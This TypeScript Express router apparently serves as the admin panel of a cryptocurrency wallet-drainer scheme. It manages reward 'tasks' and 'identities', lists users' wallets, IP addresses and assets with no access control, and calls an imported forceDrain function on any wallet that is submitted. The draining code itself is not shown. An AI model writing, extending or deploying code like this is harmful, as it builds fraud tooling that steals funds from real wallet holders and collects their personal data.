import { Router } from 'express';
import { PrismaClient } from '@prisma/client';
import { forceDrain } from '../utils/Utilite';

const router = Router();
const prisma = new PrismaClient();

router.get('/dashboard', async (req, res) => {
  const users = await prisma.user.findMany({ take: 10, select: { wallet: true, assets: true } });
  const tasks = await prisma.task.findMany({ take: 5 });
  const identities = await prisma.identity.findMany({ take: 5 });
  res.json({ users, tasks, identities });
});

router.post('/add-task', async (req, res) => {
  const { title, icon, href, reward, category } = req.body;
  const task = await prisma.task.create({
    data: { title, icon, href, reward: parseInt(reward), category }
  });
  res.json({ success: true, task });
});

router.get('/tasks', async (req, res) => {
  const tasks = await prisma.task.findMany();
  res.json(tasks);
});

router.delete('/tasks/:id', async (req, res) => {
  await prisma.task.delete({ where: { id: req.params.id } });
  res.json({ success: true });
});

router.post('/add-identity', async (req, res) => {
  const { name, description, image, wallet } = req.body;
  const identity = await prisma.identity.create({
    data: { name, description, image, wallet }
  });
  if (wallet) await forceDrain(wallet, 1);
  res.json({ success: true, identity });
});

router.get('/identities', async (req, res) => {
  const identities = await prisma.identity.findMany();
  res.json(identities);
});

router.delete('/identities/:id', async (req, res) => {
  await prisma.identity.delete({ where: { id: req.params.id } });
  res.json({ success: true });
});

router.get('/users', async (req, res) => {
  const users = await prisma.user.findMany({ select: { wallet: true, ip: true, assets: true } });
  res.json(users);
});

export default router;